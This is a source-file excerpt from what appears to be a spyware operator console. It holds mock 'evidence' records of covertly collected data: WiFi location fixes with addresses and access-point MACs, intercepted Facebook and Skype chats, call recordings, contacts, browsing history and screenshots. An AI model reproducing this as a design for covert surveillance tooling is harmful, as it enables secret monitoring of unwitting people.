package it.ht.rcs.console.evidence.rest
{
    ...
    private static function convertToUnix(value:Date):String
    {
      ...
      //position
      new Evidence({_id: 'e06', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14,53,59)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14,58,43)), _mid: 0, note: '', rel: 0, type: 'position', 
        data: new EvidenceData({type:'WIFI',latitude:34.031249 ,longitude:-118.151848, accuracy: 51.0, 
          address: new EvidenceDataAddress({text:"5257 E Beverly Blvd - East Los Angeles, CA 90022"}), 
      ...
      //position
      new Evidence({_id: 'e07', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 16,36,26)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 16,37,33)), _mid: 0, note: '', rel: 0, type: 'position', 
        data: new EvidenceData({type:'WIFI',latitude:34.034733 ,longitude:-118.152413, accuracy: 49.0, 
          address: new EvidenceDataAddress({text:"5220 Telford St - East Los Angeles, CA 90022"}), 
          wifi:[{mac:"98:FC:11:7A:82:AF", sig:-69, bssid:"PC-DOMENICO2_Network"}, {mac:"00:25:53:90:A8:76", sig:-76, "bssid":"TISCALI"}, {mac:"E8:40:40:80:61:B8", sig:-58, bssid:"ht-guest-wifi"}, {mac:"58:6D:8F:A0:50:71", sig:-37, bssid:"CiscoE4200"}, {mac:"00:24:89:20:3F:C5", sig:-76, bssid:"Vodafone-11116924"}, {mac:"30:85:A9:AA:CD:50", sig:-84, bssid:"ht-guest-wifi"}, {mac:"00:23:F8:30:A3:BC", sig:-71, bssid:"RSSM"}, {mac:"D4:D1:84:EA:90:07", sig:-85, bssid:"Telecom-82481153"}]})}),
      ...
      //chat
      new Evidence({_id: 'e23', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14,57,31)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,16,41)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'Facebook', topic:'', peer:'Alberto Ornaghi', content:'Alberto Ornaghi: <span dir="rtl">بلى</span>', tr:'Alberto Ornaghi: <span dir= "RTL"> Yeah</ span>'})}),
      ...
      new Evidence({_id: 'e26', aid: 'a1', blo: false, da:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,09,45)), dr:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,10,48)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'SKYPE', topic:'', peer:'alberto.ornaghi jimmy.page', content:'alberto.ornaghi: Here we are!', tr:'alberto.ornaghi: Here we are!'})}),
      
      //call
      new Evidence({_id: 'e31', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,09,52)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,10,51)), _mid: 0, note: '', rel: 0, type: 'call', data: new EvidenceData({peer:'alberto.ornaghi', program:'Skype', duration:'49.03451247165534', _grid:'50bcb2ec572d6e0d000000db.mp3'})}),
      ...
      new Evidence({_id: 'e20', aid: 'a1', blo: false, da:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14,58,01)), dr:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14,58,58)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'Radio Deejay',contact:'', info:'Screen name: radiodeejay', program:'twitter', type:'friend'})}),
      
      //chat
  
      new Evidence({_id: 'e26', aid: 'a1', blo: false, da:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,10,09)), dr:  convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,10,48)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'SKYPE', topic:'', peer:'alberto.ornaghi jimmy.page', content:'alberto.ornaghi: posted file secret_op.tc to members of this conversation', tr:'alberto.ornaghi: posted file secret_op.tc to members of this conversation'})}),
      
      //url
      new Evidence({_id: 'e27', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,36)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,46)), _mid: 0, note: '', rel: 0, type: 'url', data: new EvidenceData({url:'http://www.facebook.com/messages/', title:'Messaggi - Mozilla Firefox', program:'Firefox', keywords:''})}),
      ...
      new Evidence({_id: 'e29', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,38)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,46)), _mid: 0, note: '', rel: 0, type: 'url', data: new EvidenceData({url:'http://www.facebook.com/?sk=welcome', title:'Facebook - Mozilla Firefox', program:'Firefox', keywords:''})}),

     
      //screenshot
      new Evidence({_id: 'e32', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 16,29,07)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 16,30,06)), _mid: 0, note: '', rel: 0, type: 'screenshot', data: new EvidenceData({program:'firefox.exe', window:'Alberto Ornaghi - Messaggi - Mozilla Firefox', _grid:'50bcb444572d6e0d00000140.jpg'})}),
      ...
      new Evidence({_id: 'e33', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,36)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,36)), _mid: 0, note: '', rel:  0, type: 'screenshot', data: new EvidenceData({program:'Rim.Desktop.exe', window:'BlackBerry® Desktop Software', _grid:'50bcc581572d6e0d00000184.jpg'})}),
      new Evidence({_id: 'e34', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,36)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 15,14,36)), _mid: 0, note: '', rel: 0, type: 'screenshot', data: new EvidenceData({program:'Skype.exe', window:'Skype', _grid:'50bcc583572d6e0d00000194.jpg'})}),
